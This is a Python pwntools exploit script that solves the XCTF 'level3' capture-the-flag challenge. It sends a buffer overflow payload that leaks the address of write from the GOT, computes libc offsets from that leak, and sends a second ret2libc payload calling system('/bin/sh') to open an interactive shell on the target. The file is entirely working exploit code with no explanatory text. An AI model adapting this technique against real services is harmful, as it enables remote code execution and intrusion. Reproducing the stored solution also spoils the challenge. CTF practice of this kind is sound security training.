from pwn import *
from ctypes import *


local = 1
arch_32 = 1

if __name__ == '__main__':
    """
    local is not supported
    """
    # if arch_32:
    #     context(os='linux', arch='i386', log_level='debug')
    # else:
    #     context(os='linux', arch='amd64', log_level='debug')

    p = None
    ip = '111.200.241.244:64880'
    addr = '/mnt/hgfs/share/pythonProjects/pwn/challenges/xctf/level3/level3'
    ip = ip.split(':')

    if local:
        p = process([addr])
    else:
        p = remote(ip[0], int(ip[1]))

    elf = ELF(addr)
    libc = ELF('/challenges/xctf/level3/libc_32.so.6')

    write_got = elf.got['write']
    write_plt = elf.plt['write']
    main_addr = elf.symbols['main']

    payload = b'A' * 0x88 + p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0x4)

    p.sendlineafter("Input:\n", payload)
    write_got_addr = u32(p.recv()[:4])
    print('write_got address is', hex(write_got_addr))

    write_addr = libc.symbols['write']  # 0xd43c0
    bash_addr = 0x15902b  # address of '/bin/sh' in libc_32.so.6
    system_addr = libc.symbols['system']  # 0x3a940

    offset = write_got_addr - write_addr
    system_addr = offset + system_addr
    bash_addr = offset + bash_addr

    print(hex(write_addr), hex(system_addr), hex(bash_addr))  # 0xd43c0 0xf75e8940 0xf770702b
    payload = b'A' * 0x88 + p32(0xdeadbeef) + p32(system_addr) + p32(0xdeadbeef) + p32(bash_addr)

    p.sendline(payload)
    p.interactive()
